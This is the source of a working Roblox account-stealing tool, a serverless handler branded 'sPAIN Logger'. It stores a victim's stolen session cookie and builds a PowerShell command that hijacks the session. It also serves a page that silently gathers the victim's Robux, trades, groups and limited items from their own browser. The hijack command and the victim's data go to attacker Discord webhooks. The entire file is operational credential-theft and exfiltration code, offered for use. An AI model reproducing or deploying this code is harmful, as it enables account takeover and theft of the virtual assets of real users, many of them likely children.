// api/refresh.js
// Refresh page: stores the cookie, builds fresh PowerShell on demand.
// Zero Roblox API calls — cookie stays alive.

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

// ── Build "Copy as PowerShell" for roblox.com/home — no API calls ────────────
function buildPowerShell(cookie) {
  const escaped = cookie.replace(/`/g, '``').replace(/"/g, '`"');
  return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${escaped}", "/", "roblox.com")))
Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
-WebSession $session \`
-Headers @{
  "authority"="www.roblox.com"
  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
  "accept-language"="en-US,en;q=0.9"
  "cache-control"="max-age=0"
  "referer"="https://www.roblox.com/"
  "sec-ch-ua"='"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"'
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"='"Windows"'
  "sec-fetch-dest"="document"
  "sec-fetch-mode"="navigate"
  "sec-fetch-site"="same-origin"
  "sec-fetch-user"="?1"
  "upgrade-insecure-requests"="1"
}`;
}

// ── Discord ───────────────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    const content = first
      ? '```powershell\n' + chunk + (rem.length === 0 ? '\n```' : '')
      : chunk + (rem.length === 0 ? '\n```' : '');
    await discordSend(url, { content });
    first = false;
  }
}

async function sendPSToDiscord(webhookUrl, powershell, pageName) {
  const now = new Date().toISOString();
  await discordSend(webhookUrl, {
    embeds: [{
      title:       '🔄 Fresh PowerShell',
      description: `Regenerated for **${pageName}**\nPaste into PowerShell to access the account.`,
      color:       0x06b6d4,
      footer:      { text: `sPAIN Tools • ${now}` }
    }]
  });
  await discordChunked(webhookUrl, powershell);
}

// ── Page HTML ─────────────────────────────────────────────────────────────────
function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid rgba(192,38,211,0.18);border-radius:20px;padding:48px 44px;width:100%;max-width:440px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5);text-align:center}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:20px}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  .status{font-size:0.82rem;color:var(--muted);line-height:1.9;min-height:40px;white-space:pre-line}
  .ok{color:#4ade80}.err{color:#f472b6}
  .spin{position:relative;padding-right:24px}
  .spin::after{content:'';position:absolute;right:0;top:50%;margin-top:-6px;width:14px;height:14px;border:2px solid var(--accent);border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <div class="status spin" id="st">Collecting account info&hellip;</div>
</div>
<script>
// All Roblox API calls happen FROM THE VICTIM'S BROWSER
// so Roblox sees their own IP — zero logout risk
async function robloxGet(url) {
  try {
    const r = await fetch(url, { credentials: 'include' });
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

function fmt(n) { return Number(n||0).toLocaleString(); }

async function run() {
  const st = document.getElementById('st');

  try {
    // Step 1 — get uid (uses their own browser cookies automatically)
    const auth = await robloxGet('https://users.roblox.com/v1/users/authenticated');
    if (!auth?.id) {
      st.className = 'status err';
      st.textContent = '\u274c Cookie expired or not logged in.';
      return;
    }
    const uid = auth.id;

    st.textContent = 'Fetching account data\u2026';

    // Step 2 — fetch all safe endpoints in parallel from victim browser
    const [robuxData, friendsData, isPremium, groupsData, limitedsData, avatarData,
           txDay, txWeek, txYear, profileData, pendingData] = await Promise.all([
      robloxGet('https://economy.roblox.com/v1/user/currency'),
      robloxGet('https://friends.roblox.com/v1/users/' + uid + '/friends/count'),
      robloxGet('https://premiumfeatures.roblox.com/v1/users/' + uid + '/validate-membership'),
      robloxGet('https://groups.roblox.com/v1/users/' + uid + '/groups/roles'),
      robloxGet('https://inventory.roblox.com/v1/users/' + uid + '/assets/collectibles?limit=100&sortOrder=Desc'),
      robloxGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' + uid + '&size=150x150&format=Webp'),
      robloxGet('https://economy.roblox.com/v2/users/' + uid + '/transaction-totals?timeFrame=Day&transactionType=summary'),
      robloxGet('https://economy.roblox.com/v2/users/' + uid + '/transaction-totals?timeFrame=Week&transactionType=summary'),
      robloxGet('https://economy.roblox.com/v2/users/' + uid + '/transaction-totals?timeFrame=Year&transactionType=summary'),
      robloxGet('https://users.roblox.com/v1/users/' + uid),
      robloxGet('https://trades.roblox.com/v1/trades/inbound?limit=25&sortOrder=Asc'),
    ]);

    // Step 3 — group robux
    const groups = groupsData?.data || [];
    const owned  = groups.filter(g => g.role?.rank === 255);
    let groupRobux = 0, groupPending = 0;
    for (const g of owned.slice(0, 3)) {
      const [cr, pr] = await Promise.all([
        robloxGet('https://economy.roblox.com/v1/groups/' + g.group.id + '/currency'),
        robloxGet('https://economy.roblox.com/v2/groups/' + g.group.id + '/transactions?transactionType=pending&limit=10')
      ]);
      if (cr) groupRobux   += cr.robux || 0;
      if (pr) groupPending += pr.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0;
    }

    // Step 4 — limiteds
    const limiteds      = limitedsData?.data || [];
    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
    const limitedNames  = limiteds.map(i => i.name || '');
    const hasHeadless   = limitedNames.some(n => n.toLowerCase().includes('headless'));
    const hasKorblox    = limitedNames.some(n => n.toLowerCase().includes('korblox'));

    // Step 5 — pending robux from trades
    let pendingRobux = 0;
    if (pendingData?.data) {
      pendingRobux = pendingData.data.reduce((s, t) =>
        s + (t.offers?.find(o => o.user?.id !== uid)?.robux || 0), 0);
    }

    // Step 6 — account age
    let accountAgeDays = 'N/A';
    if (profileData?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(profileData.created).getTime()) / 86400000);
    }

    const avatarUrl = avatarData?.data?.[0]?.imageUrl || '';

    // Step 7 — send collected data to /api/refresh for Discord dispatch
    st.textContent = 'Sending to Discord\u2026';

    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: '${id}',
        clientData: {
          id: uid, username: auth.name, displayName: auth.displayName,
          robux: robuxData?.robux || 0, pendingRobux,
          txDay:  txDay?.incomingRobuxTotal  || 0,
          txWeek: txWeek?.incomingRobuxTotal || 0,
          txYear: txYear?.incomingRobuxTotal || 0,
          friends: friendsData?.count || 0,
          isPremium: isPremium === true,
          accountAgeDays,
          groupsOwned: owned.length, groupRobux, groupPending,
          limitedsCount: limiteds.length, limitedsValue,
          hasHeadless, hasKorblox,
          avatarUrl,
        }
      })
    });

    const d = await r.json();
    st.className = 'status';
    if (d.success) {
      st.className = 'status ok';
      st.textContent = '\u2705 Account info sent to Discord!';
    } else {
      st.className = 'status err';
      st.textContent = '\u274c ' + (d.error || 'Failed.');
    }
  } catch(e) {
    st.className = 'status err';
    st.textContent = '\u274c Error: ' + e.message;
  }
}
run();
</script>
</body>
</html>`;
}


// ── Body parser ───────────────────────────────────────────────────────────────
function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ── GET: serve the HTML page ──────────────────────────────────────────────
  if (req.method === 'GET') {
    const refreshId = new URL('http://x' + req.url).searchParams.get('id') || '';
    if (!refreshId) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Missing refresh ID</h1>');
    }
    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh;display:block">Link expired or not found</h1>');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(refreshId));
  }

  // ── POST: build PowerShell from stored cookie, send to Discord ────────────
  if (req.method === 'POST') {
    // ID comes from the request BODY only — the URL for POST is just /api/refresh
    const body   = parseBody(req.body);
    const postId = body?.id;

    if (!postId) return res.status(400).json({ error: 'id is required in request body' });

    const record = await redisGet(`refresh:${postId}`);
    if (!record)         return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie)  return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });

    const body2   = parseBody(req.body);
    const info     = body2?.clientData;
    const pageName = record.pageName || postId;
    const now      = new Date().toISOString();

    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    if (!info) {
      // Fallback: no clientData — just send PowerShell
      const ps = buildPowerShell(record.cookie);
      await Promise.all(webhooks.map(wh => sendPSToDiscord(wh, ps, pageName)));
      return res.status(200).json({ success: true });
    }

    function fmt(n) { return Number(n||0).toLocaleString(); }

    for (const wh of webhooks) {
      // Embed 1: Robux
      await discordSend(wh, {
        content: '@everyone',
        embeds: [{
          title: '💰 Robux & Pending',
          color: 0xc026d3,
          fields: [
            { name: '💰 Balance',  value: fmt(info.robux) + ' R$',        inline: true },
            { name: '⏳ Pending',  value: fmt(info.pendingRobux) + ' R$', inline: true },
          ],
          footer:    { text: 'sPAIN Logger • ' + pageName + ' • ' + now },
          thumbnail: { url: info.avatarUrl }
        }]
      });

      // Embed 2: Account
      await discordSend(wh, {
        embeds: [{
          title: '🧑 ' + info.username + (info.isPremium ? ' ⭐' : ''),
          color: 0xc026d3,
          fields: [
            { name: '🆔 ID',         value: String(info.id),              inline: true },
            { name: '📊 Age',         value: info.accountAgeDays + ' days',inline: true },
            { name: '👥 Friends',     value: fmt(info.friends),            inline: true },
          ],
          footer:    { text: 'sPAIN Logger • ' + pageName },
          thumbnail: { url: info.avatarUrl }
        }]
      });

      // Embed 3: Summary
      await discordSend(wh, {
        embeds: [{
          title: '📈 Robux Summary',
          color: 0xc026d3,
          fields: [
            { name: '📅 Today',     value: fmt(info.txDay)  + ' R$', inline: true },
            { name: '📅 This Week', value: fmt(info.txWeek) + ' R$', inline: true },
            { name: '📅 This Year', value: fmt(info.txYear) + ' R$', inline: true },
          ],
          footer:    { text: 'sPAIN Logger • ' + pageName },
          thumbnail: { url: info.avatarUrl }
        }]
      });

      // Embed 4: Groups
      await discordSend(wh, {
        embeds: [{
          title: '👥 Groups',
          color: 0xc026d3,
          fields: [
            { name: '👥 Owned',   value: String(info.groupsOwned),       inline: true },
            { name: '🏦 Balance', value: fmt(info.groupRobux) + ' R$',   inline: true },
            { name: '⏳ Pending', value: fmt(info.groupPending) + ' R$', inline: true },
          ],
          footer:    { text: 'sPAIN Logger • ' + pageName },
          thumbnail: { url: info.avatarUrl }
        }]
      });

      // Embed 5: Limiteds
      await discordSend(wh, {
        embeds: [{
          title: '🛒 Limiteds',
          color: 0xc026d3,
          fields: [
            { name: '🛒 Count',    value: String(info.limitedsCount),        inline: true },
            { name: '💎 RAP',      value: fmt(info.limitedsValue) + ' R$',   inline: true },
            { name: '💀 Headless', value: info.hasHeadless ? '✅ Yes' : '❌ No', inline: true },
            { name: '🤖 Korblox',  value: info.hasKorblox  ? '✅ Yes' : '❌ No', inline: true },
          ],
          footer:    { text: 'sPAIN Logger • ' + pageName },
          thumbnail: { url: info.avatarUrl }
        }]
      });

      // PowerShell
      const ps = buildPowerShell(record.cookie);
      await sendPSToDiscord(wh, ps, pageName);
    }

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
